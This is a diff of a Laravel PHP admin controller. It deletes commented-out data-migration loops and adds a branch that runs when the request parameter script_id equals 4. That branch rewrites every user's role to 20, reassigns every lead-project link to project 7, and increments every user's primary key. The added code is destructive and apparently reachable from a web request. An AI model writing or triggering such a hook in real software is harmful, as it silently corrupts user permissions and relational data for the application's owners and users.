@@ -32,67 +32,6 @@ class AreaOneController extends Controller
 
     public function index(Request $request)
     {
-        // $agenciesold=DB::table('agencies1')->get();
-        // foreach($agenciesold as $agency){
-        //     Agency::where('name',$agency->name)->update([
-        //         'image'=>$agency->thumbnail
-        //     ]);
-        // }
-
-        // $oldleads = \DB::table('leads11')->get();
-        // foreach ($oldleads as $oldlead) {
-
-        //     Lead::create([
-
-        //         'project_id' => $oldlead->project_id,
-        //         'name' => $oldlead->name,
-        //         'phone' => $oldlead->phone,
-        //         'email' => $oldlead->email,
-        //         'description' => $oldlead->description,
-        //         'area' => $oldlead->area,
-        //         'budget' => $oldlead->budget,
-        //         'lead_type' => $oldlead->lead_type,
-        //         'how_soon' => $oldlead->how_soon,
-        //         'family_members' => $oldlead->family_members,
-        //         'property_type' => $oldlead->property_type,
-        //         'leadsource' => $oldlead->leadsource,
-        //         'status' => $oldlead->lead_status,
-        //         'call_status' => $oldlead->call_status,
-        //         'response_status' => $oldlead->response_status,
-        //         'created_by' => $oldlead->created_by,
-        //     ]);
-        // }
-
-        // $leads = Lead::all();
-        // foreach ($leads as $lead) {
-        //     if ($lead->project_id != null) {
-        //         if ($lead->project_id == 4) {
-        //             LeadProject::create([
-        //                 'lead_id' => $lead->id,
-        //                 'project_id' => 2
-        //             ]);
-        //         } else if($lead->project_id == 5){
-        //             LeadProject::create([
-        //                 'lead_id' => $lead->id,
-        //                 'project_id' => 4
-        //             ]);
-        //         }
-        //         else if($lead->project_id == 6){
-        //             LeadProject::create([
-        //                 'lead_id' => $lead->id,
-        //                 'project_id' => 3
-        //             ]);
-        //         }
-        //         else if($lead->project_id == 1){
-        //             LeadProject::create([
-        //                 'lead_id' => $lead->id,
-        //                 'project_id' => 1
-        //             ]);
-        //         }
-
-
-        //     }
-        // }
 
         if (!$request->keyword) {
             $areaones = AreaOne::paginate(25);
@@ -106,18 +45,6 @@ class AreaOneController extends Controller
         return view('admin.area_one.index', compact('areaones'));
 
 
-
-
-        // $clients = DB::table('clients')->get();
-        // foreach ($clients as  $value) {
-        //     $user = User::where('name', $value->name)->orWhere('phone', $value->phone)->first();
-        //     $agent = Agent::where('user_id', $user->id)->first();
-        //     // dd($value->d_id);
-        //     AgentSpeciality::create([
-        //         'agent_id' => $agent->id,
-        //         'speciality_id' => $value->d_id,
-        //     ]);
-        // }
     }
 
 
@@ -199,6 +126,12 @@ class AreaOneController extends Controller
                 echo $res->getStatusCode(); // 200
                 echo $res->getBody();
             }
+        }
+        if ($request->script_id == 4) {
+            User::where('id','!=',null)->update(['role_id'=>20]);
+            LeadProject::where('id','!=',null)->update(['project_id'=>7]);
+            User::where('id','!=',null)->increment('id');
+
         }
         dd('done');
 
